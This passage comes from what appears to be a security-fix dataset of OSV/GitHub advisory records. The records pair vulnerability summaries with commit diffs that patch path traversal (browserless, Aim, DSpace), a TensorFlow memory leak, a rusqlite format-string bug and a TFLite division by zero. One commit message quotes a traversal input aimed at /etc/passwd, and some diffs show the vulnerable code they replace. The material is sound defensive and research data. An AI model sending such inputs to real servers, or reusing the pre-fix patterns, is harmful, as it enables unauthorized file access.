server.","published_date":"2021-05-10","chain_len":1,"project":"https:\/\/github.com\/browserless\/chrome","commit_href":"https:\/\/github.com\/browserless\/chrome\/commit\/848b87e5bea4f8473eea85261a5ff922d6ebd2b6","commit_sha":"848b87e5bea4f8473eea85261a5ff922d6ebd2b6","patch":"SINGLE","chain_ord":"['848b87e5bea4f8473eea85261a5ff922d6ebd2b6']","before_first_fix_commit":"{'6a195ab11d393cefcecf9940b38cf6921e3d38d0'}","last_fix_commit":"848b87e5bea4f8473eea85261a5ff922d6ebd2b6","chain_ord_pos":1.0,"commit_datetime":"10\/26\/2020, 17:28:01","message":"Ensure workspace files are _in_ the workspace DIR","author":"Joel Griffith","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'src\/routes.ts': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/browserless\/chrome\/raw\/848b87e5bea4f8473eea85261a5ff922d6ebd2b6\/src%2Froutes.ts', 'patch': '@@ -157,9 +157,12 @@ export const getRoutes = ({\\n       }\\n \\n       const filePath = path.join(workspaceDir, file);\\n-\\n       const hasFile = await exists(filePath);\\n \\n+      if (!filePath.includes(workspaceDir)) {\\n+        return res.sendStatus(404);\\n+      }\\n+\\n       if (!hasFile) {\\n         return res.sendStatus(404);\\n       }\\n@@ -185,6 +188,10 @@ export const getRoutes = ({\\n       const filePath = path.join(workspaceDir, file);\\n       const hasFile = await exists(filePath);\\n \\n+      if (!filePath.includes(workspaceDir)) {\\n+        return res.sendStatus(404);\\n+      }\\n+\\n       if (!hasFile) {\\n         return res.sendStatus(404);\\n       }'}}","message_norm":"ensure workspace files are _in_ the workspace dir","language":"en","entities":"[('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/routes.ts'])","num_files":1.0},{"index":1236,"vuln_id":"GHSA-8phj-f9w2-cjcc","cwe_id":"{'CWE-22'}","score":8.6,"chain":"{'https:\/\/github.com\/aimhubio\/aim\/pull\/1003\/commits\/f01266a1a479ef11d7d6c539e7dd89e9d5639738'}","dataset":"osv","summary":"Arbitrary file reading vulnerability in Aim ### Impact\nA path traversal attack aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with \u201cdot-dot-slash (..\/)\u201d sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.\n\nVulnerable code: https:\/\/github.com\/aimhubio\/aim\/blob\/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce\/aim\/web\/api\/views.py#L9-L16\n\n### Patches\nThe vulnerability issue is resolved in Aim v3.1.0.\n\n### References\nhttps:\/\/owasp.org\/www-community\/attacks\/Path_Traversal","published_date":"2021-11-23","chain_len":1,"project":"https:\/\/github.com\/aimhubio\/aim","commit_href":"https:\/\/github.com\/aimhubio\/aim\/pull\/1003\/commits\/f01266a1a479ef11d7d6c539e7dd89e9d5639738","commit_sha":"f01266a1a479ef11d7d6c539e7dd89e9d5639738","patch":"SINGLE","chain_ord":"['f01266a1a479ef11d7d6c539e7dd89e9d5639738']","before_first_fix_commit":"{'0bcac8b709f9409518134b2eafee817278aca14f'}","last_fix_commit":"f01266a1a479ef11d7d6c539e7dd89e9d5639738","chain_ord_pos":1.0,"commit_datetime":"11\/12\/2021, 14:03:22","message":"Fix security issue when incorrect path is given to the endpoint that serves static files which can lead to a leak of non wanted files (e.g. \/static-files\/..\/..\/..\/..\/etc\/passwd)","author":"mihran113","comments":null,"stats":"{'additions': 9, 'deletions': 1, 'total': 10}","files":"{'aim\/web\/api\/views.py': {'additions': 9, 'deletions': 1, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/aimhubio\/aim\/raw\/f01266a1a479ef11d7d6c539e7dd89e9d5639738\/aim%2Fweb%2Fapi%2Fviews.py', 'patch': \"@@ -1,15 +1,23 @@\\n import os\\n+from pathlib import Path\\n \\n from aim.web.api.utils import APIRouter  # wrapper for fastapi.APIRouter\\n from fastapi.responses import FileResponse\\n+from fastapi import HTTPException\\n \\n statics_router = APIRouter()\\n \\n \\n @statics_router.get('\/static-files\/{path:path}\/')\\n async def serve_static_files(path):\\n     from aim import web\\n-    static_file_name = os.path.join(os.path.dirname(web.__file__), 'ui', 'build', path)\\n+    static_file_root = os.path.join(os.path.dirname(web.__file__), 'ui', 'build')\\n+    static_file_name = os.path.join(static_file_root, path)\\n+\\n+    # check if path is leading inside ui\/build directory\\n+    if not Path(static_file_root) in Path(static_file_name).resolve().parents:\\n+        raise HTTPException(404)\\n+\\n     compressed_file_name = '{}.gz'.format(static_file_name)\\n     if os.path.exists(compressed_file_name):\\n         return FileResponse(compressed_file_name, headers={'Content-Encoding': 'gzip'})\"}}","message_norm":"fix security issue when incorrect path is given to the endpoint that serves static files which can lead to a leak of non wanted files (e.g. \/static-files\/..\/..\/..\/..\/etc\/passwd)","language":"en","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('leak', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['aim\/web\/api\/views.py'])","num_files":1.0},{"index":1243,"vuln_id":"GHSA-8r7c-3cm2-3h8f","cwe_id":"{'CWE-401'}","score":4.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd'}","dataset":"osv","summary":"Memory leak in Tensorflow ### Impact\nIf a graph node is invalid, TensorFlow can leak memory in the [implementation of `ImmutableExecutorState::Initialize`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/common_runtime\/immutable_executor_state.cc#L84-L262):\n\n```cc\nStatus s = params_.create_kernel(n->properties(), &item->kernel);\nif (!s.ok()) {\n  item->kernel = nullptr;\n  s = AttachDef(s, *n);\n  return s;           \n}                     \n```\n\nHere, we set `item->kernel` to `nullptr` but it is a simple `OpKernel*` pointer so the memory that was previously allocated to it would leak.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd","commit_sha":"c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd","patch":"SINGLE","chain_ord":"['c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd']","before_first_fix_commit":"{'d781eab54947e82ebf182f28dcdd5b02e6925d46'}","last_fix_commit":"c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd","chain_ord_pos":1.0,"commit_datetime":"11\/10\/2021, 21:51:15","message":"Fix memory leak when a graph node is invalid.\n\nIf a graph node is invalid but a kernel is created then we set the kernel back to `nullptr` but we forget to delete it. Hence, we get a memory leak.\n\nPiperOrigin-RevId: 408968108\nChange-Id: I1d8a9d0d8988ed5e08be8b9f2004ce1b4cd11b7c","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/core\/common_runtime\/immutable_executor_state.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd\/tensorflow%2Fcore%2Fcommon_runtime%2Fimmutable_executor_state.cc', 'patch': '@@ -131,6 +131,7 @@ Status ImmutableExecutorState::Initialize(const Graph& graph) {\\n \\n     Status s = params_.create_kernel(n->properties(), &item->kernel);\\n     if (!s.ok()) {\\n+      params_.delete_kernel(item->kernel);\\n       item->kernel = nullptr;\\n       s = AttachDef(s, *n);\\n       return s;'}}","message_norm":"fix memory leak when a graph node is invalid.\n\nif a graph node is invalid but a kernel is created then we set the kernel back to `nullptr` but we forget to delete it. hence, we get a memory leak.\n\npiperorigin-revid: 408968108\nchange-id: i1d8a9d0d8988ed5e08be8b9f2004ce1b4cd11b7c","language":"en","entities":"[('fix', 'ACTION', ''), ('memory leak', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('memory leak', 'SECWORD', ''), ('408968108', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/common_runtime\/immutable_executor_state.cc'])","num_files":1.0},{"index":1244,"vuln_id":"GHSA-8r7q-r9mx-35rh","cwe_id":"{'CWE-134'}","score":9.8,"chain":"{'https:\/\/github.com\/rusqlite\/rusqlite\/commit\/2327d3b774927fdf48903c0bdc1ca7ec93c7c8d0'}","dataset":"osv","summary":"Mishandling of format strings in rusqlite An issue was discovered in the rusqlite crate before 0.23.0 for Rust. Memory safety can be violated because rusqlite::trace::log mishandles format strings.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/rusqlite\/rusqlite","commit_href":"https:\/\/github.com\/rusqlite\/rusqlite\/commit\/2327d3b774927fdf48903c0bdc1ca7ec93c7c8d0","commit_sha":"2327d3b774927fdf48903c0bdc1ca7ec93c7c8d0","patch":"SINGLE","chain_ord":"['2327d3b774927fdf48903c0bdc1ca7ec93c7c8d0']","before_first_fix_commit":"{'abbab7216a8b47108a0e1b7a26e429d6a990d7a6'}","last_fix_commit":"2327d3b774927fdf48903c0bdc1ca7ec93c7c8d0","chain_ord_pos":1.0,"commit_datetime":"04\/14\/2020, 19:08:26","message":"Fix format string error in rusqlite::trace::log","author":"Thom Chiovoloni","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/trace.rs': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rusqlite\/rusqlite\/raw\/2327d3b774927fdf48903c0bdc1ca7ec93c7c8d0\/src%2Ftrace.rs', 'patch': '@@ -61,7 +61,7 @@ pub unsafe fn config_log(callback: Option<fn(c_int, &str)>) -> Result<()> {\\n pub fn log(err_code: c_int, msg: &str) {\\n     let msg = CString::new(msg).expect(\"SQLite log messages cannot contain embedded zeroes\");\\n     unsafe {\\n-        ffi::sqlite3_log(err_code, msg.as_ptr());\\n+        ffi::sqlite3_log(err_code, b\"%s\\\\0\" as *const _ as *const c_char, msg.as_ptr());\\n     }\\n }'}}","message_norm":"fix format string error in rusqlite::trace::log","language":"en","entities":"[('error', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/trace.rs'])","num_files":1.0},{"index":1251,"vuln_id":"GHSA-8rm6-75mf-7r7r","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5117e0851348065ed59c991562c0ec80d9193db2'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of hashtable lookup ### Impact\nThe TFLite implementation of hashtable lookup is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8\/tensorflow\/lite\/kernels\/hashtable_lookup.cc#L114-L115):\n\n```cc\nconst int num_rows = SizeOfDimension(value, 0); \nconst int row_bytes = value->bytes \/ num_rows; \n```\n\nAn attacker can craft a model such that `values`'s first dimension would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [5117e0851348065ed59c991562c0ec80d9193db2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5117e0851348065ed59c991562c0ec80d9193db2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5117e0851348065ed59c991562c0ec80d9193db2","commit_sha":"5117e0851348065ed59c991562c0ec80d9193db2","patch":"SINGLE","chain_ord":"['5117e0851348065ed59c991562c0ec80d9193db2']","before_first_fix_commit":"{'ba6822bd7b7324ba201a28b2f278c29a98edbef2'}","last_fix_commit":"5117e0851348065ed59c991562c0ec80d9193db2","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 23:16:56","message":"Prevent a division by 0\n\nPiperOrigin-RevId: 371007407\nChange-Id: Iecf2718de48d6bf5a69b02a9df9deda8ec1b19d3","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/hashtable_lookup.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/5117e0851348065ed59c991562c0ec80d9193db2\/tensorflow%2Flite%2Fkernels%2Fhashtable_lookup.cc', 'patch': '@@ -112,6 +112,7 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, 2, &value));\\n \\n   const int num_rows = SizeOfDimension(value, 0);\\n+  TF_LITE_ENSURE(context, num_rows != 0);\\n   const int row_bytes = value->bytes \/ num_rows;\\n   void* pointer = nullptr;\\n   DynamicBuffer buf;'}}","message_norm":"prevent a division by 0\n\npiperorigin-revid: 371007407\nchange-id: iecf2718de48d6bf5a69b02a9df9deda8ec1b19d3","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('371007407', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/hashtable_lookup.cc'])","num_files":1.0},{"index":1252,"vuln_id":"GHSA-8rmh-55h4-93h5","cwe_id":"{'CWE-22'}","score":7.2,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199'}","dataset":"osv","summary":"DSpace ItemImportService API Vulnerable to Path Traversal in Simple Archive Format Package Import ### Impact\nItemImportServiceImpl is vulnerable to a path traversal vulnerability. This means a malicious SAF (simple archive format) package could cause a file\/directory to be created anywhere the Tomcat\/DSpace user can write to on the server.  However, this path traversal vulnerability is only possible by a user with special privileges (either Administrators or someone with command-line access to the server).  This vulnerability impacts the XMLUI, JSPUI and command-line.\n\n_This vulnerability does NOT impact 7.x._\n\n### Patches\n\n_DSpace 6.x:_ \n* Fixed in 6.4 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0\n* 6.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0.patch (may be applied manually if an immediate upgrade to 6.4 or 7.x is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.11 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199\n* 5.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199.patch (may be applied manually if an immediate upgrade to 5.11 or 6.4 or 7.x is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\n\nAs a basic workaround, you may block all access to the following URL paths:\n* If you are using the XMLUI, block all access to `\/admin\/batchimport` path (this is the URL of the Admin Batch Import tool). Keep in mind, if your site uses the path \"\/xmlui\", then you'd need to block access to `\/xmlui\/admin\/batchimport`.\n* If you are using the JSPUI, block all access to `\/dspace-admin\/batchimport` path (this is the URL of the Admin Batch Import tool).  Keep in mind, if your site uses the path \"\/jspui\", then you'd need to block access to `\/jspui\/dspace-admin\/batchimport`.\n\nKeep in mind, only an Administrative user or a user with command-line access to the server is able to import\/upload SAF packages. Therefore, assuming those users do not blindly upload untrusted SAF packages, then it is unlikely your site could be impacted by this vulnerability.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":2,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0","commit_sha":"7af52a0883a9dbc475cf3001f04ed11b24c8a4c0","patch":"MULTI","chain_ord":"['7af52a0883a9dbc475cf3001f04ed11b24c8a4c0', '56e76049185bbd87c994128a9d77735ad7af0199']","before_first_fix_commit":"{'73cdff26fdc40bb022e21dcfdeefebf28057cde7'}","last_fix_commit":"56e76049185bbd87c994128a9d77735ad7af0199","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2020, 00:44:54","message":"[DS-4131] Fix zip import handling to avoid path traversal exploit","author":"Kim Shepherd","comments":null,"stats":"{'additions': 36, 'deletions': 7, 'total': 43}","files":"{'dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java': {'additions': 36, 'deletions': 7, 'changes': 43, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0\/dspace-api%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fitemimport%2FItemImportServiceImpl.java', 'patch': '@@ -55,6 +55,8 @@\\n import javax.xml.transform.TransformerException;\\n import java.io.*;\\n import java.net.URL;\\n+import java.nio.file.Path;\\n+import java.nio.file.Paths;\\n import java.sql.SQLException;\\n import java.text.SimpleDateFormat;\\n import java.util.*;\\n@@ -1630,26 +1632,36 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n         {\\n             log.error(\"Zip file \\'\" + zipfile.getAbsolutePath() + \"\\' does not exist, or is not readable.\");\\n         }\\n+        log.debug(\"Extracting zip at \" + zipfile.getAbsolutePath());\\n \\n         String destinationDir = destDir;\\n         if (destinationDir == null){\\n         \\tdestinationDir = tempWorkDir;\\n         }\\n+        log.debug(\"Using directory \" + destinationDir + \" for zip extraction. (destDir arg is \" + destDir +\\n+                \", tempWorkDir is \" + tempWorkDir + \")\");\\n \\n         File tempdir = new File(destinationDir);\\n         if (!tempdir.isDirectory())\\n         {\\n-            log.error(\"\\'\" + ConfigurationManager.getProperty(\"org.dspace.app.itemexport.work.dir\") +\\n-                    \"\\' as defined by the key \\'org.dspace.app.itemexport.work.dir\\' in dspace.cfg \" +\\n+            log.error(\"\\'\" + ConfigurationManager.getProperty(\"org.dspace.app.batchitemexport.work.dir\") +\\n+                    \"\\' as defined by the key \\'org.dspace.app.batchitemexport.work.dir\\' in dspace.cfg \" +\\n                     \"is not a valid directory\");\\n         }\\n \\n         if (!tempdir.exists() && !tempdir.mkdirs())\\n         {\\n             log.error(\"Unable to create temporary directory: \" + tempdir.getAbsolutePath());\\n         }\\n-        String sourcedir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName();\\n-        String zipDir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName() + System.getProperty(\"file.separator\");\\n+\\n+        if(!destinationDir.endsWith(System.getProperty(\"file.separator\"))) {\\n+            destinationDir += System.getProperty(\"file.separator\");\\n+        }\\n+\\n+        String sourcedir = destinationDir + zipfile.getName();\\n+        String zipDir = destinationDir + zipfile.getName() + System.getProperty(\"file.separator\");\\n+\\n+        log.debug(\"zip directory to use is \" + zipDir);\\n \\n \\n         \/\/ 3\\n@@ -1660,11 +1672,27 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n         while (entries.hasMoreElements())\\n         {\\n             entry = entries.nextElement();\\n+            \/\/ Check that the true path to extract files is never outside allowed temp directories\\n+            \/\/ without creating any actual files on disk\\n+            log.debug(\"Inspecting entry name: \" + entry.getName() + \" for path traversal security\");\\n+            File potentialExtract = new File(zipDir + entry.getName());\\n+            String canonicalPath = potentialExtract.getCanonicalPath();\\n+            log.debug(\"Canonical path to potential File is \" + canonicalPath);\\n+            if(!canonicalPath.startsWith(zipDir)) {\\n+                log.error(\"Rejecting zip file: \" + zipfile.getName() + \" as it contains an entry that would be extracted \" +\\n+                        \"outside the temporary unzip directory: \" + canonicalPath);\\n+                throw new IOException(\"Error extracting \" + zipfile + \": Canonical path of zip entry: \" +\\n+                        entry.getName() + \" (\" + canonicalPath + \") does not start with permissible temp unzip directory (\" + destinationDir +\\n+                        \")\");\\n+            }\\n+\\n             if (entry.isDirectory())\\n             {\\n-                if (!new File(zipDir + entry.getName()).mkdir())\\n-                {\\n+                \/\/ Log error and throw IOException if a directory entry could not be created\\n+                File newDir = new File(zipDir + entry.getName());\\n+                if (!newDir.mkdirs()) {\\n                     log.error(\"Unable to create contents directory: \" + zipDir + entry.getName());\\n+                    throw new IOException(\"Unable to create contents directory: \" + zipDir + entry.getName());\\n                 }\\n             }\\n             else\\n@@ -1673,6 +1701,7 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n                 log.info(\"Extracting file: \" + entry.getName());\\n \\n                 int index = entry.getName().lastIndexOf(\\'\/\\');\\n+                log.debug(\"Index of \" + entry.getName() + \" is \" + index);\\n                 if (index == -1)\\n                 {\\n                     \/\/ Was it created on Windows instead?\\n@@ -1701,11 +1730,11 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n                         }\\n                     }\\n \\n-\\n                 }\\n                 byte[] buffer = new byte[1024];\\n                 int len;\\n                 InputStream in = zf.getInputStream(entry);\\n+                log.debug(\"Reading \" + zipDir + entry.getName() + \" into InputStream\");\\n                 BufferedOutputStream out = new BufferedOutputStream(\\n                         new FileOutputStream(zipDir + entry.getName()));\\n                 while((len = in.read(buffer)) >= 0)'}}","message_norm":"[ds-4131] fix zip import handling to avoid path traversal exploit","language":"en","entities":"[('fix', 'ACTION', ''), ('path traversal', 'SECWORD', ''), ('exploit', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java'])","num_files":1.0},{"index":1253,"vuln_id":"GHSA-8rmh-55h4-93h5","cwe_id":"{'CWE-22'}","score":7.2,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199'}","dataset":"osv","summary":"DSpace ItemImportService API Vulnerable to Path Traversal in Simple Archive Format Package Import ### Impact\nItemImportServiceImpl is vulnerable to a path traversal vulnerability. This means a malicious SAF (simple archive format) package could cause a file\/directory to be created anywhere the Tomcat\/DSpace user can write to on the server.  However, this path traversal vulnerability is only possible by a user with special privileges (either Administrators or someone with command-line access to the server).  This vulnerability impacts the XMLUI, JSPUI and command-line.\n\n_This vulnerability does NOT impact 7.x._\n\n### Patches\n\n_DSpace 6.x:_ \n* Fixed in 6.4 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0\n* 6.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0.patch (may be applied manually if an immediate upgrade to 6.4 or 7.x is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.11 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199\n* 5.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199.patch (may be applied manually if an immediate upgrade to 5.11 or 6.4 or 7.x is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\n\nAs a basic workaround, you may block all access to the following URL paths:\n* If you are using the XMLUI, block all access to `\/admin\/batchimport` path (this is the URL of the Admin Batch Import tool). Keep in mind, if your site uses the path \"\/xmlui\", then you'd need to block access to `\/xmlui\/admin\/batchimport`.\n* If you are using the JSPUI, block all access to `\/dspace-admin\/batchimport` path (this is the URL of the Admin Batch Import tool).  Keep in mind, if your site uses the path \"\/jspui\", then you'd need to block access to `\/jspui\/dspace-admin\/batchimport`.\n\nKeep in mind, only an Administrative user or a user with command-line access to the server is able to import\/upload SAF packages. Therefore, assuming those users do not blindly upload untrusted SAF packages, then it is unlikely your site could be impacted by this vulnerability.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":2,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199","commit_sha":"56e76049185bbd87c994128a9d77735ad7af0199","patch":"MULTI","chain_ord":"['7af52a0883a9dbc475cf3001f04ed11b24c8a4c0', '56e76049185bbd87c994128a9d77735ad7af0199']","before_first_fix_commit":"{'73cdff26fdc40bb022e21dcfdeefebf28057cde7'}","last_fix_commit":"56e76049185bbd87c994128a9d77735ad7af0199","chain_ord_pos":2.0,"commit_datetime":"01\/14\/2022, 00:37:25","message":"[DS-4131] Better path handling in ItemImport zips","author":"Kim Shepherd","comments":null,"stats":"{'additions': 30, 'deletions': 6, 'total': 36}","files":"{'dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImport.java': {'additions': 30, 'deletions': 6, 'changes': 36, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/56e76049185bbd87c994128a9d77735ad7af0199\/dspace-api%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fitemimport%2FItemImport.java', 'patch': '@@ -2003,22 +2003,30 @@ public static String unzip(File zipfile, String destDir) throws IOException {\\n         if (destinationDir == null){\\n         \\tdestinationDir = tempWorkDir;\\n         }\\n+        log.debug(\"Using directory \" + destinationDir + \" for zip extraction. (destDir arg is \" + destDir +\\n+                \", tempWorkDir is \" + tempWorkDir + \")\");\\n \\n         File tempdir = new File(destinationDir);\\n         if (!tempdir.isDirectory())\\n         {\\n-            log.error(\"\\'\" + ConfigurationManager.getProperty(\"org.dspace.app.itemexport.work.dir\") +\\n-                    \"\\' as defined by the key \\'org.dspace.app.itemexport.work.dir\\' in dspace.cfg \" +\\n+            log.error(\"\\'\" + ConfigurationManager.getProperty(\"org.dspace.app.batchitemimport.work.dir\") +\\n+                    \"\\' as defined by the key \\'org.dspace.app.batchitemimport.work.dir\\' in dspace.cfg \" +\\n                     \"is not a valid directory\");\\n         }\\n \\n         if (!tempdir.exists() && !tempdir.mkdirs())\\n         {\\n             log.error(\"Unable to create temporary directory: \" + tempdir.getAbsolutePath());\\n         }\\n-        String sourcedir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName();\\n-        String zipDir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName() + System.getProperty(\"file.separator\");\\n \\n+        if(!destinationDir.endsWith(System.getProperty(\"file.separator\"))) {\\n+            destinationDir += System.getProperty(\"file.separator\");\\n+        }\\n+\\n+        String sourcedir = destinationDir + zipfile.getName();\\n+        String zipDir = destinationDir + zipfile.getName() + System.getProperty(\"file.separator\");\\n+\\n+        log.debug(\"zip directory to use is \" + zipDir);\\n \\n         \/\/ 3\\n         String sourceDirForZip = sourcedir;\\n@@ -2028,11 +2036,26 @@ public static String unzip(File zipfile, String destDir) throws IOException {\\n         while (entries.hasMoreElements())\\n         {\\n             entry = entries.nextElement();\\n+            \/\/ Check that the true path to extract files is never outside allowed temp directories\\n+            \/\/ without creating any actual files on disk\\n+            log.debug(\"Inspecting entry name: \" + entry.getName() + \" for path traversal security\");\\n+            File potentialExtract = new File(zipDir + entry.getName());\\n+            String canonicalPath = potentialExtract.getCanonicalPath();\\n+            log.debug(\"Canonical path to potential File is \" + canonicalPath);\\n+            if(!canonicalPath.startsWith(zipDir)) {\\n+                log.error(\"Rejecting zip file: \" + zipfile.getName() + \" as it contains an entry that would be extracted \" +\\n+                        \"outside the temporary unzip 